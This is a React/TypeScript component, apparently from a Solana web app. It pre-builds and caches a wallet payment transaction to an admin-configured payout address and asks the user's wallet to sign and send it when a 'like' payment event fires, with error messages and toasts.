import { useEffect, useRef, useState, useCallback } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildLikePaymentTransaction, type LikePayment } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent') || lower.includes('insufficient funds')) {
    return 'Not enough SOL to pay the network fee for this transfer.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, signTransaction } = useWallet()
  const { connection } = useConnection()
  const [, setSubmitting] = useState(false)
  const inFlight = useRef(false)

  // Pre-built transaction cache — refreshed every 45s (blockhash expires at ~60s)
  const prebuilt = useRef<{ payment: LikePayment; builtAt: number } | null>(null)
  const building = useRef(false)
  const refreshTimer = useRef<ReturnType<typeof setInterval> | null>(null)

  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  /** Build (or rebuild) the transaction and cache it */
  const preBuild = useCallback(async () => {
    if (building.current) return
    if (!publicKeyRef.current || !walletAddress) return

    let cfg: PayoutConfig = getLocalPayoutConfig()
    try { cfg = await loadPayoutConfig() } catch { /* use local */ }
    if (!isValidSolanaAddress(cfg.walletAddress)) return

    building.current = true
    try {
      const payment = await buildLikePaymentTransaction({
        connection: connectionRef.current,
        from: publicKeyRef.current,
        config: cfg,
      })
      prebuilt.current = { payment, builtAt: Date.now() }
      console.log('[PaymentRequestPrompt] pre-built tx ready:', payment.label)
    } catch (err) {
      prebuilt.current = null
      console.warn('[PaymentRequestPrompt] pre-build failed:', err)
    } finally {
      building.current = false
    }
  }, [walletAddress])

  // Pre-build immediately on wallet connect, then refresh every 45s
  useEffect(() => {
    if (!connected || !walletAddress || !publicKey) {
      prebuilt.current = null
      if (refreshTimer.current) clearInterval(refreshTimer.current)
      refreshTimer.current = null
      return
    }

    // Start building right away
    preBuild()

    // Keep refreshing — blockhash expires at ~60s so refresh every 45s
    refreshTimer.current = setInterval(preBuild, 45_000)
    return () => {
      if (refreshTimer.current) clearInterval(refreshTimer.current)
      refreshTimer.current = null
    }
  }, [connected, walletAddress, publicKey, preBuild])

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (!publicKeyRef.current || !walletAddress) {
        openWalletModalRef.current()
        return
      }

      let config: PayoutConfig = getLocalPayoutConfig()
      try { config = await loadPayoutConfig() } catch { /* use local */ }
      if (!isValidSolanaAddress(config.walletAddress)) {
        toast.error('Save a payout address in admin before a like can request a payment.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      closeWalletModalRef.current()

      try {
        // Use pre-built transaction if it's fresh (< 45s old)
        const cached = prebuilt.current
        const isFresh = cached && Date.now() - cached.builtAt < 45_000

        const payment = isFresh
          ? cached!.payment   // ← instant, no wait
          : await buildLikePaymentTransaction({  // ← fallback: build now
              connection: connectionRef.current,
              from: publicKeyRef.current,
              config,
            })

        // Consume the cache and start pre-building the next one in background
        prebuilt.current = null
        preBuild()

        // Wallet popup appears instantly
        const signed = await signTransactionRef.current?.(payment.transaction)
        if (!signed) {
          toast.error('The wallet did not approve the payment.')
          return
        }
        await connectionRef.current.sendRawTransaction(signed.serialize(), {
          skipPreflight: false,
          preflightCommitment: 'confirmed',
          maxRetries: 3,
        })
        notifyFundsConfirmed(peekPendingLike())
        toast.success(`Sent ${payment.label}`)
      } catch (err) {
        const message = isWalletUserCancel(err) ? 'Payment cancelled' : sendErrorMessage(err)
        toast.error(message)
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress, preBuild])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
    }
  }, [connected, walletAddress])

  return null
}
